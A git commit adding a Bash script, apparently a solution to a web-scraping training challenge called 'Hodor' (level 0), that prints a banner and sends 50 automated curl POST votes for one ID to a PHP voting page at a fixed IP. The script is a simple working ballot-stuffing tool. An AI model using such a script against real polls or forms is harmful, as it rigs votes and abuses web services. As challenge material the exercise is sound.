89ab077736c0b50a895ae54d68835c014ea517c8
dkb4rb <dkb4rb@localhost.localdomain>
2021-10-10 03:24:22 -0500

    Solution Vote 1024 with Bash Scripting

---
+++ level_0/level0.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+trap ctrl_c INT
+
+function ctrl_c(){
+echo -e "\n[*] Saliendo del Programa ..."
+exit 1;
+}
+
+function banner(){
+echo " ___   ___   ______   ______   ______   ______       "
+echo "/__/\ /__/\ /_____/\ /_____/\ /_____/\ /_____/\      "
+echo "\::\ \\\  \ \\\:::_ \ \\\:::_ \ \\\:::_ \ \\\:::_ \ \     "
+echo " \::\/_\ .\ \\\:\ \ \ \\\:\ \ \ \\\:\ \ \ \\\:(_) ) )_   "
+echo "  \:: ___::\ \\\:\ \ \ \\\:\ \ \ \\\:\ \ \ \\\: __  \ \  "
+echo "   \: \ \\\::\ \\\:\_\ \ \\\:\/.:| |\:\_\ \ \\\ \ \  \ \ "
+echo "    \__\/ \::\/ \_____\/ \____/_/ \_____\/ \\_\/ \_\/ "
+echo ""
+echo -ne "[!] Project Web Scrapping Hodor"
+echo -ne "\n\t [*] Elaborado por.. Juan Duque\n"
+
+}
+
+for send in $(seq 1 50); do
+	ids=2
+	curl -X POST -d "id=$ids&holdthedoor=submit" http://158.69.76.135/level0.php > /dev/null 2>&1
+	clear
+	banner
+	echo -ne "\n[!] Tu numero de Id es: [$ids]\n"
+	echo -ne "\n[!] Votando .. \n\tNum Votes [$send]"
+done
+echo -ne "\tFelicidades \n[!] Has Votado $send veces"
